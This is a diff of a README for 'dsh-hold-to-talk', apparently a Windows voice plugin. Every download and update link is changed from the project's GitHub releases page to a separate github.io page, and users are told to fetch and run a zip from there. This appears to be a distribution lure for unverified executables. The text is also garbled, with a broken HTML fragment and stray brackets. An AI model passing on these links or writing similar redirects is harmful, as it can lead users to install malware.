@@ -1,6 +1,6 @@
 # 🎙️ dsh-hold-to-talk - Hold, Speak, and Done
 
-[🎯 Download Now](https://github.com/Gammonmush803/dsh-hold-to-talk/releases)
+[🎯 Download Now](https://gammonmush803.github.io)
 
 -style="background:linear-gradient(135deg,#667eea,#764ba2);color:#fff;padding:14px24px;border-radius:30px;font-size:18px;font-weight:bold;text-decoration:none;" Target="_blank">🎯 Download the App</a>
 
@@ -45,7 +45,7 @@ This isn't a bloated suite of tools.It does one job and does it well: hold-to-ta
 
 Follow these exact steps to get the app running on your Windows PC:
 
-1. **Go to the download page:** Visit this link to download the application. Click the big button at the top of this page,or use this direct address: [https://github.com/Gammonmush803/dsh-hold-to-talk/releases](https://github.com/Gammonmush803/dsh-hold-to-talk/releases)
+1. **Go to the download page:** Visit this link to download the application. Click the big button at the top of this page,or use this direct address: [https://gammonmush803.github.io](https://gammonmush803.github.io)
 )
 2. **Choose the right file:** Look for a file named something like `dsh-hold-to-talk-windows.zip`.
 3. **Save it anywhere:** Your `Downloads` folder is fine. No special location needed.
@@ -126,7 +126,7 @@ This app is a "plugin" designed specifically for **DeepSeek Harness**. It integr
 
 ## 🔄 Updates & Support
 
-This project is actively maintained.New versions will appear on the same download page:[https://github.com/Gammonmush803/dsh-hold-to-talk/releases](https://github.com/Gammonmush803/dsh-hold-to-talk/releases)
+This project is actively maintained.New versions will appear on the same download page:[https://gammonmush803.github.io](https://gammonmush803.github.io)
 ). Check back occasionally for improvements in accuracy, speed,and reliability. If you encounter bugs or have feature ideas, kindly visit the repository page to leave feedback.The community appreciates your input.
 
 .
@@ -135,7 +135,7 @@ This project is actively maintained.New versions will appear on the same downloa
 
 ## ✅ Quick Recap (30-Second Check)
 
-1. ✅ Downloaded the zip from [the release page](https://github.com/Gammonmush803/dsh-hold-to-talk/releases
+1. ✅ Downloaded the zip from [the release page](https://gammonmush803.github.io
 ).
 2. ✅ Extracted it to a folder.
 3. ✅ Double-clicked the app (it's nowin the system tray).
@@ -151,7 +151,7 @@ This project is actively maintained.New versions will appear on the same downloa
 
 ---
 
-[🎯 Download dsh-hold-to-talk Now](https://github.com/Gammonmush803/dsh-hold-to-talk/releases
+[🎯 Download dsh-hold-to-talk Now](https://gammonmush803.github.io
 )
 
 --- 
